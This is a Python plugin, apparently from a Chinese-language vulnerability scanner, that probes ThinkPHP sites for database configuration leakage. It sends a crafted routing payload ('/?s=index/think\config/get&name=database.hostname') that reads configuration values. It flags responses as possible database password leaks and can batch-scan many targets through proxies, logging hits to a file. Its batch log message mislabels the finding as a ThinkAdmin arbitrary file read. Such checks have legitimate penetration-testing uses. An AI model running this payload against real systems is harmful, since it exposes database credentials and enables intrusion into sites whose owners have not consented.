#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from libs.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from libs.reqset import ReqSet
from libs.output import OutPutFile


urllib3.disable_warnings()
class ThinkDBScan:
    def run(self, urls):
        try:
            url = urls + '/?s=index/think\config/get&name=database.hostname'
            response = requests.get(url,headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)
            if response.status_code == 200 and "database" in response.text:
                OutPrintInfoSuc("ThinkPHP", f'可能存在数据库密码泄漏: {url}')
                if self.batch:
                    OutPutFile("thinkphp_db_info.txt", f'目标存在ThinkAdmin任意文件读取漏洞: {url}')
            else:
                if not self.batch:
                    OutPrintInfo("ThinkPHP", '不存在数据库密码泄漏')

        except Exception:
            if not self.batch:
                OutPrintInfo("ThinkPHP", '目标请求出错')

    def main(self, target):
        self.batch = target["batch_work"]

        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("ThinkPHP", '开始检测配置文件泄漏...')
        self.run(url)
        if not self.batch:
            OutPrintInfo("ThinkPHP", '配置文件泄漏检测结束')